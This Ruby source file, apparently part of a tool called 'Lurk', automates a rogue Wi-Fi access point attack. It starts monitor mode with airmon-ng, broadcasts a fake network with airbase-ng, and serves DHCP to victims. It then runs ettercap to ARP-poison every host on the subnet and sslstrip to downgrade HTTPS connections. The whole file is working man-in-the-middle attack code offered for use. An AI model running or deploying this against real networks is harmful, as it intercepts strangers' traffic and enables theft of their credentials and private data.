require 'singleton'
require 'yaml'
module Lurk
  class Lurker
    include Singleton
    include LurkerHelpers
  
    def run config=nil
      @running = true
      lurker_setup(config) if config
      interface_setup
      run_process "airmon-ng start #{@wiface}", "Airmon"
      sleep 10 unless @dry   
      wiface_setup
      run_process("airbase-ng #{@airbase_variables} --essid #{@essid} -F rogueap -v  mon0  > #{@airbase_log}", "Airbase")
      gateway_setup
      iptables_setup
      dhcp_setup
      run_process("dhcpd3 -f -cf dhcpd.conf at0", "DHCP")
      sleep 5 unless @dry
      start_logging
      puts "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
      run_process "xterm -bg black -fg blue -e ettercap -T -q -p -l #{@ettercap_log} -i at0 // //", "ettercap"
      sleep 8 unless @dry
      run_process "sslstrip -a -k -f", "sslstrip"
     
    end

    def stop
        lurk_execute "airmon-ng stop mon0; ifconfig at0 down;"
        %w{sslstrip dhcp3 ettercap lurk tail}.each{|file| lurk_execute "pkill #{file}"}
    end

    def start_logging
      puts "Launching logs"
      run_process "xterm -bg black -fg yellow -T Airbase-NG -e tail -f #{@airbase_log}", "Airbase log"

      run_process "xterm -bg black -fg red -T \"Lurk System Logs\" -e tail -f /var/log/messages", "Messages log"
    end

    def run_process command, name
      fork { lurk_execute command }
    end
  end
end
